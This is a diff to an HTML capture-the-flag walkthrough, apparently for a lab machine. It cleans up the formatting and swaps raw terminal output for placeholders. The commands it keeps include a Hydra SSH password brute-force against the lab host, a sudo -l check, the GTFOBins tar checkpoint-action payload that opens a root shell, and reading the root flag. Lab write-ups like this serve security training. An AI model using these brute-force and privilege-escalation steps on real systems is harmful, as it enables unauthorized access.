@@ -234,107 +234,79 @@ Ed
 Edward
 Ein
 Faye</pre>
-   
-        <h2>Step 5: Escalating Privileges</h2>
+
+    <h2>Step 5: Escalating Privileges</h2>
     <pre>
-       Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.
+        Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.
 
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# hydra ssh://10.10.253.164 -L users.txt -P locks.txt
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+        # hydra ssh://10.10.253.164 -L users.txt -P locks.txt
+        [Hydra output]
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:46:04
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 182 login tries (l:7/p:26), ~12 tries per task
-[DATA] attacking ssh://10.10.253.164:22/
-1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:46:59
+        Unfortunately, we found nothing!
 
-Unfortunately, we found nothing!
+        Wait, are you as dumb as me? We found that user's password earlier. Do you have any guesses?
 
-Wait, are you as dumb as me, we found that users password way too before, Do you have any guesses?
+        Don’t worry! I’ll tell you.
 
-Don’t worry! I’ll tell you.
-
-This above result shows that there is no user available from that list we created, it means the user is lin himself. Ultimately, the password is the exact one we found before.
+        This above result shows that there is no user available from that list we created. It means the user is lin himself. Ultimately, the password is the exact one we found before.
     </pre>
     <p>
-        # Step6
+        # Step 6: Obtaining Root Flag
 
-Now, we have a user lin and his password.
+        Now, we have a user lin and his password.
 
-We have to finf the root flag, so we have to escalate our permissions.
+        We have to find the root flag, so we have to escalate our permissions.
 
-Let’s log in to the server again via SSH for lin.
+        Let’s log in to the server again via SSH for lin.
 
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# ssh [lin@10.10.253.164](mailto:lin@10.10.253.164)
+        # ssh lin@10.10.253.164
 
-The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
-ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.253.164' (ED25519) to the list of known hosts.
-[lin@10.10.253.164](mailto:lin@10.10.253.164)'s password:
-Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+        [SSH login output]
 
-- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
-- Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
-- Support: https://ubuntu.com/advantage
+        Now, you have to find out what commands you can run from lin’s access.
 
-83 packages can be updated.
-0 updates are security updates.
+        Hit a command: sudo -l
 
-Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
-lin@bountyhacker:~/Desktop$
+        [sudo -l output]
 
-Now, you have to find out what commands you can run from lin’s access.
+        As you can see, we can execute tar as root.
 
-Hit a command : sudo -l 
+        Now, without wasting any time, let’s get into <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> and search for tar.
 
-lin@bountyhacker:~/Desktop$ sudo -l
-[sudo] password for lin:
-Sorry, try again.
-[sudo] password for lin:
-Matching Defaults entries for lin on bountyhacker:
-env_reset, mail_badpass,
-secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+        After you get into that binary page, navigate to a subsection for SUDO.
 
-User lin may run the following commands on bountyhacker:
-(root) /bin/tar
+        You will find something like this:
 
-As, you can see we can fire tar as root. 
+        If the binary is allowed to run as a superuser by sudo, the payload below does not drop the elevated privileges and may be used to access the file system, escalate, or maintain privileged access.
 
-Now, without wasting any time, let’s get into [GFTOBINS](https://gtfobins.github.io/)  and search for tar and click on it.
+        <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>
 
-After, you get into that binary page, you have to navigate into a subsection for SUDO.
+        Now, execute that command payload.
 
-You will find something like this: 
+        # sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
-If the binary is allowed to run as a superuser by `sudo`,  the payload below does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+        [Tar command output]
 
-`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
+        Now, check who you are by running <code>whoami</code>.
 
-Now, fire that command payload.
+        # whoami
 
-lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-tar: Removing leading `/' from member names
+        <code>root</code>
 
-Now, check who are you by whoami.
+        BRAVO! You are now root.
 
-# #whoami
-root
+        Now, you have to find the root.txt flag. 
+        To find it on the file system, just run <code>locate root.txt</code>.
 
-### BRAVO! You are now root.
+        # locate root.txt
 
-Now, you have to find the root.txt flag. 
-To find it on the file system just fire a command locate root.txt
+        <code>/root/root.txt</code>
 
-# #locate root.txt
-/root/root.txt
-#cat /root/root.txt
-XxXxXxXxXxXxXx
+        # cat /root/root.txt
 
-Felicitaciones! You did it!</p>
+        <code>XxXxXxXxXxXxXx</code>
+
+        Felicitaciones! You did it!
+    </p>
 </body>
 </html>
